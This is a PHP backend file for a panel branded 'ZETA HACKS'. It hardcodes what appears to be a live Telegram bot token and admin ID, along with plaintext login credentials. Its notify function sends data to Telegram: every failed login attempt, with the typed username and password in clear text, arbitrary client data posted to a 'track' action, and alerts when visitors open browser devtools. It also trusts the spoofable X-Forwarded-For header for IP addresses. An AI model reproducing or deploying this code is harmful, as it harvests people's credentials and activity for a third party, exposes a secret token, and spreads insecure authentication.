<?php
session_start();
date_default_timezone_set('America/La_Paz');

/* * 🔱 ZETA HACKS - PROCESADOR CENTRAL V12
 * NIVEL DE SEGURIDAD: CLASIFICADO
 * CÓDIGO PROTEGIDO CONTRA CLONACIÓN
 */

$token = "8474739152:AAF8T6-YIonvsmwe6Oc2BX5ePwdLZnwbCAE";
$admin_id = "7621351319";

// BASE DE DATOS DE AGENTES (INYECTABLE)
$agentes = array (
  0 => array ('u' => 'zeta', 'p' => '1420', 'n' => 'ZETA MASTER', 'ip' => '127.0.0.1', 'status' => 'Active'),
);
$agentes = array (
  0 => array ('u' => 'Angel', 'p' => 'Rojas', 'n' => 'Angel David', 'ip' => '127.0.0.1', 'status' => 'Active'),
);

function getIP() { 
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; }
    return $_SERVER['REMOTE_ADDR']; 
}

function notify($m) {
    global $token, $admin_id;
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$admin_id&text=".urlencode($m)."&parse_mode=Markdown";
    @file_get_contents($url);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['accion'])) {
    $ip = getIP();
    $timestamp = date('Y-m-d H:i:s');
    $ag_nombre = $_SESSION['agente'] ?? 'Infiltrado';

    switch ($_POST['accion']) {
        case 'login':
            $user = filter_var($_POST['u'], FILTER_SANITIZE_STRING);
            $pass = $_POST['p'];
            foreach ($agentes as $a) {
                if ($a['u'] === $user && $a['p'] === $pass) {
                    $_SESSION['zeta_auth'] = true;
                    $_SESSION['agente'] = $a['n'];
                    notify("🔱 *ACCESO AUTORIZADO*\n👤 Agente: `{$a['n']}`\n🌐 IP: `{$ip}`\n⏰ Hora: `{$timestamp}`");
                    echo "ok"; exit;
                }
            }
            notify("🚨 *INTENTO DE HACKEO*\n👤 User: `{$user}`\n🔑 Pass: `{$pass}`\n🌐 IP: `{$ip}`\n⚠️ Acción: Bloqueo Temporal.");
            echo "error";
            break;

        case 'track':
            $data = filter_var($_POST['data'], FILTER_SANITIZE_STRING);
            notify("🛰️ *LOG DE ACTIVIDAD*\n👤 Agente: `{$ag_nombre}`\n📍 Info: `{$data}`\n🌐 IP: `{$ip}`");
            break;

        case 'shield_alert':
            notify("🛡️ *ZETA SHIELD ACTIVADO*\n👤 Agente: `{$ag_nombre}`\n⚠️ Motivo: Intentó abrir consola (F12/Inspect)\n🌐 IP: `{$ip}`");
            break;
    }
    exit;
}
